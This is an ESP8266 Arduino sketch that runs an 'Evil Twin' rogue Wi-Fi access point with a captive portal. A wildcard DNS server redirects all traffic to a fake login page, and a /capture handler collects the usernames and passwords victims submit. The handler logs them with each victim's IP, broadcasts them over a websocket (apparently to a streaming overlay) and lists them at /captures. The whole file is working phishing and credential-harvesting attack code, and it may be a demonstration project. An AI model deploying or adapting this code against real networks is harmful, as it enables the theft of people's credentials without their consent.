#include <AsyncWebSocket.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>

#include "device_logger.h"
#include "obs_toast_html.h"
#include "portal_html.h"
#include "websocket_interface.h"

extern "C" {
#include "user_interface.h"
}

const char *AP_SSID = "UNGS 100% Real No Fake";
const char *AP_PASS = "";
IPAddress apIP(192, 168, 4, 1);
const byte DNS_PORT = 53;

DNSServer dnsServer;
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");
std::vector<String> captureLog;

void setup() {
  Serial.begin(115200);
  Serial.println("\nConfigurando Evil Twin y Portal Cautivo...");

  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);
  Serial.print("Access Point \"");
  Serial.print(AP_SSID);
  Serial.println("\" iniciado.");
  Serial.print("IP del AP: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("Servidor DNS iniciado.");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", HTML_PORTAL);
  });

  server.on("/obs-toast", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", HTML_TOAST_OBS);
  });

  server.on("/capture", HTTP_POST, [](AsyncWebServerRequest *request) {
    String user = request->getParam("user", true)->value();
    String pass = request->getParam("pass", true)->value();

    String data = "{\"User\":\"" + user + "\",\"Pass\":\"" + pass + "\"}";
    ws.textAll("{\"type\": \"capture\", \"data\": " + data + "}");
    String capture = request->client()->remoteIP().toString() + " > " + data;
    Serial.println(capture);
    captureLog.push_back(capture);

    request->send(200, "text/plain", "Credenciales recibidas!");
  });

  server.on("/captures", HTTP_GET, [](AsyncWebServerRequest *request) {
    String response = "<pre>";
    for (const auto &capture : captureLog) {
      response += capture + "\n";
    }
    response += "</pre>";
    request->send(200, "text/html", response);
  });

  server.on("/log", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", getLogPre());
  });

  server.onNotFound([](AsyncWebServerRequest *request) {
    if (request->method() == HTTP_GET) {
      if (!request->host().equals(apIP.toString()) && !request->host().equals("192.168.4.1")) {
        request->redirect("http://" + apIP.toString());
        return;
      }
    }
    request->send(404, "text/plain", "Not Found");
  });

  ws.onEvent([](AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
    if (type == WS_EVT_CONNECT) {
      Serial.printf("Cliente WebSocket conectado: %u\n", client->id());
    } else if (type == WS_EVT_DISCONNECT) {
      Serial.printf("Cliente WebSocket desconectado: %u\n", client->id());
    } // else if (type == WS_EVT_DATA)
  });
  server.addHandler(&ws);

  server.begin();
  Serial.println("Servidor HTTP iniciado.");
}

unsigned long lastDeviceCheck = 0;
void loop() {
  dnsServer.processNextRequest();

  if (millis() - lastDeviceCheck > 5000) {
    lastDeviceCheck = millis();
    checkConnectedDevices();
  }
}